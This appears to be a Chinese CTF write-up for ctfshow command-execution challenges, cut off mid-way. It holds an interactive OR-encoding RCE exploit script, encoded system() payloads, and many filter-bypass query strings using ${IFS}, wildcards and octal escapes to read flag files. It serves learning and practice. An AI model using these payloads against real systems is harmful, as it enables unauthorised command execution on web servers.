<p>if(!preg_match(‘&#x2F;[0-9]|[a-z]|^|+|~|$|[|]|{|}|&amp;|-&#x2F;i’, $c)){  eval(“echo($c);”);</p>
<p>这段PHP代码的作用是检查变量</p>
<p>$c是否不包含任何数字（0-9）、小写字母（a-z）、以及一系列特殊字符（包括^、+、~、$、[、]、{、}、&amp;、-）。如果变量</p>
<p>$c不包含这些字符中的任何一个，那么它将执行eval(“echo($c);”);语句。</p>
<p>这个题过滤了$、+、-、^、~使得<strong>异或自增和取反</strong>构造字符都无法使用，同时过滤了字母和数字。但是特意留了个（或运算符）|</p>
<p>思路如下：</p>
<ul>
<li>首先对ascii从0-255所有字符中筛选出未被过滤的字符，然后两两进行或运算，存储结果。</li>
<li>跟据题目要求，构造payload的原型，并将原型替换为或运算的结果</li>
<li>使用POST请求发送c,获取flag</li>
</ul>
<p>1.方法一</p>
<p>采用了大佬的脚本</p>
<p><strong>rce_or.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;<span class="comment">//绕过的运算符</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">        <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">        <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">            <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>

<p>大体意思就是从进行异或的字符中排除掉被过滤的然后在判断异或得到的字符是否为可见字符。</p>
<p><strong>exp.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure>

<p>在文件中用cmd命令:</p>
<p>python exp.py url(记得https改成http，我找了好久才找到错误的原因)</p>
<p>即可获取flag!</p>
<p>方法二</p>
<p>1.用字符手动构造payload</p>
<p>(system)(‘ls’)</p>
<p>c&#x3D;(“%13%19%13%14%05%0d”|”%60%60%60%60%60%60”)(“%00%0c%13%00”|”%27%60%60%27”)</p>
<p>(system)(cat flag.php)</p>
<p>c&#x3D;(“%13%19%13%14%05%0d”|”%60%60%60%60%60%60”)(“%03%01%14%00%06%0c%01%07%00%10%08%10”|”%60%60%60%20%60%60%60%60%2e%60%60%60”) </p>
<p>2.用脚本自动生成payload</p>
<p>python</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">hex_i = <span class="string">&quot;&quot;</span></span><br><span class="line">hex_j = <span class="string">&quot;&quot;</span></span><br><span class="line">pattern=<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span></span><br><span class="line">str1=[<span class="string">&quot;system&quot;</span>,<span class="string">&quot;ls&quot;</span>]//要构造的字符串 system 和 ls</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    t1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    t2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> str1[p]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> re.search(pattern,<span class="built_in">chr</span>(i)) :</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> re.search(pattern,<span class="built_in">chr</span>(j)) :</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_i=<span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">if</span> j &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_j=<span class="string">&quot;0&quot;</span>+<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_j=<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                hex_i=<span class="string">&#x27;%&#x27;</span>+hex_i</span><br><span class="line">                hex_j=<span class="string">&#x27;%&#x27;</span>+hex_j</span><br><span class="line">                c=<span class="built_in">chr</span>(<span class="built_in">ord</span>(urllib.parse.unquote(hex_i))|<span class="built_in">ord</span>(urllib.parse.unquote(hex_j)))</span><br><span class="line">                <span class="keyword">if</span>(c ==k):</span><br><span class="line">                    t1=t1+hex_i</span><br><span class="line">                    t2=t2+hex_j</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(\&quot;&quot;</span>+t1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+t2+<span class="string">&quot;\&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>得出的结果与手动构造一样，但相抵便捷一点</p>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><h3 id="重定向丢弃的绕过"><a href="#重定向丢弃的绕过" class="headerlink" title="#重定向丢弃的绕过"></a>#重定向丢弃的绕过</h3><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203113618790.png" alt="image-20241203113618790"></p>
<p>解析代码:system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);</p>
<ul>
<li>system() 是PHP中的一个函数，用于执行外部程序，并显示输出。</li>
<li>$c 是一个变量，它应该包含要执行的命令的字符串。</li>
<li>&gt;&#x2F;dev&#x2F;null 是重定向操作符，它的作用是将标准输出（stdout）重定向到&#x2F;dev&#x2F;null，一个特殊的设备文件，用于丢弃所有写入其中的数据。</li>
<li>在类Unix系统中,&#x2F;dev&#x2F;null,或称空设备,<strong>是一个特殊的设备文件</strong>,它丢弃一切写入其中的数据(但报告写入操作成功)</li>
<li>2&gt;&amp;1 是另一个重定向操作符，它的作用是将标准错误输出（stderr，文件描述符为2）重定向到标准输出（stdout，文件描述符为1）的当前位置。在这个上下文中，因为标准输出已经被重定向到&#x2F;dev&#x2F;null，所以<strong>标准错误输出也会被重定向到</strong>&#x2F;dev&#x2F;null。</li>
</ul>
<p><strong>所以这里是不进行回显</strong>，输入的内容会被丢弃，该怎么办呢？答案是可以使用 <code>&quot;;&quot; ,&quot;||&quot; ,&quot; &amp; &quot;,&quot; &amp;&amp; &quot; </code>分隔，如?c&#x3D;ls&amp;&amp;pwd. 执行的时候会将两个都正常执行，但由于重定向，后面的pwd指令的结果会被丢弃而不被输出</p>
<h3 id="知识点-通道符"><a href="#知识点-通道符" class="headerlink" title="知识点:通道符"></a><strong>知识点:通道符</strong></h3><p>; &#x2F;&#x2F;分号</p>
<p>| &#x2F;&#x2F;只执行后面那条命令</p>
<p>|| &#x2F;&#x2F;只执行前面那条命令</p>
<p>&amp; &#x2F;&#x2F;两条命令都会执行</p>
<p>&amp;&amp; &#x2F;&#x2F;两条命令都会执行</p>
<h3 id="知识点-重定向"><a href="#知识点-重定向" class="headerlink" title="知识点:重定向"></a><strong>知识点:重定向</strong></h3><p>重定向(Redirect)就是通过各种方法<strong>将各种网络请求重新定个方向转到其它位置</strong></p>
<p>重定向是网页制作中的一个知识。假设你现在所处的位置是一个论坛的登录页面，你填写了帐号，密码，点击登陆，如果你的帐号密码正确，就自动跳转到论坛的首页，不正确就返回登录页；<strong>这里的自动跳转，就是重定向的意思</strong>。或者可以说，<strong>重定向就是，在网页上设置一个约束条件，条件满足，就自动转入到其它网页、网址。</strong></p>
<p><strong>解题思路:</strong></p>
<p><strong>1.查看目录:?c&#x3D;ls;ls</strong></p>
<p><strong>语句拼接后是system(ls;ls</strong>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1**);由于;的作用是逐步执行，由于重定向，后面的ls执行的结果会被丢弃而不会输出**</p>
<p><strong>2.查看flag.php:?c&#x3D;tac flag.php;ls</strong></p>
<p><strong>同1的解释</strong></p>
<p><strong>最后成功获得flag!</strong></p>
<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><h3 id="过滤-重定向"><a href="#过滤-重定向" class="headerlink" title="#过滤+重定向"></a>#过滤+重定向</h3><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203113808719.png" alt="image-20241203113808719"></p>
<p><strong>正常的过滤+重定向</strong></p>
<p>;分号用不了那就用别的管道符</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls&amp;&amp;ls---查看目录</span><br></pre></td></tr></table></figure>

<p>当时我传进去后发现没有回显，以为是我自己理解错了，结果是参数处理错误，意思就是当?c&#x3D;ls&amp;&amp;ls时服务器只是将ls识别成c的传递值，而不是ls&amp;&amp;ls，当他们经过url编码后服务器才会把完整的ls&amp;&amp;ls当成是给c传递的值，所以我们的payload应该是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=ls%26%26ls</span><br><span class="line"></span><br><span class="line">?c=tac flag.php%26%26ls---查看flag</span><br></pre></td></tr></table></figure>

<p>当然||和|,&amp;都是可以的，但||和|不是中间件，&amp;是中间件，所以需要解析</p>
<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203114948954.png" alt="image-20241203114948954"></p>
<p>跟上题一样</p>
<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115011171.png" alt="image-20241203115011171"></p>
<p>一样</p>
<h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115023290.png" alt="image-20241203115023290"></p>
<h2 id="wbe47"><a href="#wbe47" class="headerlink" title="wbe47"></a>wbe47</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115242537.png" alt="image-20241203115242537"></p>
<p>只是过滤了很多cat的替代命令，tac可以正常用</p>
<h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115319047.png" alt="image-20241203115319047"></p>
<p>还是没过滤掉tac</p>
<p><strong>常见的命令工具:</strong></p>
<p>sed：</p>
<ul>
<li>是一个流编辑器，用于对文本进行过滤和转换。</li>
<li>可以逐行读取文件或管道输入，并根据指定的规则对文本进行处理。</li>
<li>支持删除、替换、插入、追加文本等操作，以及使用正则表达式进行匹配和替换。</li>
</ul>
<p>cut：</p>
<ul>
<li>用于从文本文件中提取列或字段。</li>
<li>可以按字节、字符或指定分隔符来切割文本。</li>
<li>支持从文本中提取指定范围的字符或字段，并输出到标准输出或指定文件。</li>
</ul>
<p>awk：</p>
<ul>
<li>是一个强大的文本处理工具，用于对文本文件进行格式化、扫描和处理。</li>
<li>可以使用模式匹配和动作对文本进行过滤和转换。</li>
<li>支持内置变量和自定义函数，以及使用正则表达式进行匹配和替换。</li>
<li>常用于处理和分析日志文件、数据报表等。</li>
</ul>
<p>strings：</p>
<ul>
<li>用于从二进制文件中提取可打印的字符串。</li>
<li>可以扫描文件并输出所有长度超过指定阈值的连续可打印字符序列。</li>
<li>常用于分析二进制文件的内容，如可执行文件、库文件等。</li>
</ul>
<p>od：</p>
<ul>
<li>是一个八进制转储工具，用于以不同的格式（如八进制、十六进制、十进制等）显示文件内容。</li>
<li>可以读取二进制文件，并以指定的格式输出其内容。</li>
<li>常用于分析二进制文件的结构和内容。</li>
</ul>
<p>curl：</p>
<ul>
<li>是一个命令行工具，用于在命令行下执行URL传输操作。</li>
<li>支持多种协议，如HTTP、HTTPS、FTP等。</li>
<li>可以用于下载或上传文件，以及发送GET、POST等HTTP请求。</li>
<li>常用于自动化脚本中，用于从Web服务器获取数据或向Web服务器发送数据。</li>
</ul>
<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115353682.png" alt="image-20241203115353682"></p>
<p>比上次多过滤了一个百分号，但这是当百分号作为参数传递的时候才会被过滤，而url编码不会</p>
<p>：在进行URL编码时，通常不会直接过滤掉百分号，因为百分号是编码机制的一部分。</p>
<p>所以还是可以正常用的</p>
<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115417447.png" alt="image-20241203115417447"></p>
<p>过滤了两个编码，%09和%26，分别是制表符和&amp;符号，但我们依旧可以用其他的去代替他们</p>
<p>用&lt;&gt;代替空格，用||去代替&amp;&amp;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?c=tac&lt;fla%27%27g.php||</span><br><span class="line">/?c=tac&lt;&gt;fl\ag.php||ls</span><br></pre></td></tr></table></figure>

<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115459175.png" alt="image-20241203115459175"></p>
<p>这次居然过滤了tac，另外同cat功能的函数还有： cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev</p>
<p>所以我们使用nl进行绕过：?c&#x3D;nl&lt;&gt;fl\ag.php||ls</p>
<p>或者绕过过滤:?c&#x3D;ta\c&lt;&gt;fl\ag.php||ls</p>
<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115532705.png" alt="image-20241203115532705"></p>
<p>?c&#x3D;ta\c${IFS}fl\ag.php||	发现flag不在里面</p>
<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115552580.png" alt="image-20241203115552580"></p>
<p>我们看看根目录呢</p>
<p>?c&#x3D;ls${IFS}&#x2F;||ls</p>
<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115605412.png" alt="image-20241203115605412"></p>
<p>发现flag在根目录里面</p>
<p>?c&#x3D;ta\c${IFS}&#x2F;fl\ag||ls拿取根目录的flag</p>
<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115627179.png" alt="image-20241203115627179"></p>
<p>意思是我们像c传递的值会被当成system的命令，并将执行结果赋值给d，然后输出d，做法是一样的没有变</p>
<p>?c&#x3D;ta\c${IFS}fl\ag.php</p>
<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115650126.png" alt="image-20241203115650126"></p>
<p>*：星号，通常用作通配符。里面的意思是所有包含其中字符的字符串都会被过滤，例如*f.*l.*a.*g意思就是只要传递的参数中包含flag字符串都会被过滤，所以flag绕过方式就不可以了。</p>
<p>如说cat，.*当出现cat这个整体时才会进行匹配，会尽可能匹配较多字符，ca，c之类的字符不会进行匹配，tac为什么不能用t??,是因为还有一个跟它一样长度的命令top</p>
<p>解法一:</p>
<p>使用mv命令把flag文件重命名，再使用uniq查看a.txt</p>
<p>c&#x3D; mv${IFS}fla?.php${IFS}a.txt</p>
<p>c&#x3D;uniq${IFS}a.txt</p>
<p>解法二:</p>
<p>凡是按序出现了cat 都被匹配。 这时，我们不能直接写ca?因为这样是匹配不到命令的。 只能把全路径写出来只能把全路径写出来，如&#x2F;bin&#x2F;ca?,与&#x2F;bin&#x2F;ca?匹配的只有&#x2F;bin&#x2F;cat命令,所以构造payload:</p>
<p>?c&#x3D;&#x2F;bin&#x2F;ca?${IFS}????.??? </p>
<p>解法三:直接用uniq查看</p>
<p>c&#x3D;uniq${IFS}f???.php</p>
<h3 id="知识点-uniq"><a href="#知识点-uniq" class="headerlink" title="知识点:uniq"></a>知识点:uniq</h3><p>uniq命令的基本功能是检测和删除文本文件中相邻的重复行，或者仅显示重复行、不重复行</p>
<p>解法四:</p>
<p>c&#x3D;grep${IFS}-r${IFS}’ctfshow’${IFS}.</p>
<h3 id="知识点-grep的常用选项与示例"><a href="#知识点-grep的常用选项与示例" class="headerlink" title="知识点:grep的常用选项与示例"></a>知识点:grep的常用选项与示例</h3><ol>
<li>基本搜索：</li>
</ol>
<ul>
<li>grep “pattern” filename：在文件filename中搜索包含pattern的行。</li>
</ul>
<ol>
<li>显示匹配行的行号：</li>
</ol>
<ul>
<li>grep -n “pattern” filename：在输出匹配行的同时，显示其行号。</li>
</ul>
<ol>
<li>反向匹配：</li>
</ol>
<ul>
<li>grep -v “pattern” filename：输出不包含pattern的行。</li>
</ul>
<ol>
<li>统计匹配行的数量：</li>
</ol>
<ul>
<li>grep -c “pattern” filename：统计并输出匹配pattern的行的数量。</li>
</ul>
<ol>
<li>递归搜索：</li>
</ol>
<ul>
<li>grep -r “pattern” directory：在目录directory及其子目录中递归搜索包含pattern的文件。</li>
</ul>
<ol>
<li>使用正则表达式：</li>
</ol>
<ul>
<li>grep -E “pattern1|pattern2” filename：使用扩展正则表达式，匹配pattern1或pattern2。</li>
</ul>
<ol>
<li>不区分大小写：</li>
</ol>
<ul>
<li>grep -i “pattern” filename：在搜索时不区分大小写。</li>
</ul>
<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><h3 id="无字母rce"><a href="#无字母rce" class="headerlink" title="#无字母rce"></a>#无字母rce</h3><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115825635.png" alt="image-20241203115825635"></p>
<p>这次把字母过滤了</p>
<p><strong>解法一:base64程序查看flag.php</strong></p>
<p>由于过滤了字母，但没有过滤数字，我们尝试使用&#x2F;bin目录下的可执行程序。</p>
<p>?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</p>
<p>替换后变成</p>
<p>?c&#x3D;&#x2F;???&#x2F;????64 ????.???</p>
<p><strong>解法二:采用数字编码</strong></p>
<p>$’\xxx’ 语法用于表示使用八进制（octal）编码的字符</p>
<p><strong>$’\164\141\143’ $’\146\154\141\147\56\160\150\160</strong></p>
<p><strong>解法三:临时文件rce</strong></p>
<p>利用文件上传进行命令执行</p>
<p>1.构造POST数据包(或使用postman直接上传文件)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span 